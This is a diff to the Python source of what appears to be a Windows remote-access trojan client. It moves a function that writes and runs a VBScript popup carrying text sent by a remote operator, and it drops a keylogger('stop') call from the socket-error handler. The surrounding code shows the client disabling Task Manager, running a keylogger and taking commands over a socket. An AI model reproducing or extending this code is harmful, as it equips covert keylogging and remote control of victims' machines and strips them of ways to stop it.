@@ -12,14 +12,6 @@ TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 
 
-# vbs message box
-def MessageBox(message):
-    objVBS = open(TMP + "/m.vbs", "w")
-    objVBS.write("Msgbox \"" + message + "\", 64, \"Message\"")
-    objVBS.close()
-    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
-
-
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
@@ -76,7 +68,15 @@ def recvall(buffer):  # function to receive large amounts of data
         if len(bytData) == buffer:
             return bytData
 
-
+			
+# vbs message box
+def MessageBox(message):
+    objVBS = open(TMP + "/m.vbs", "w")
+    objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
+    objVBS.close()
+    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
+	
+	
 def msg(data):
     strMsg = data[3:len(data)]
     MessageBox(strMsg)
@@ -392,5 +392,4 @@ try:
             disable_taskmgr()
 except socket.error:  # if the server closes without warning
     objSocket.close()
-    keylogger("stop")
     sys.exit(0)
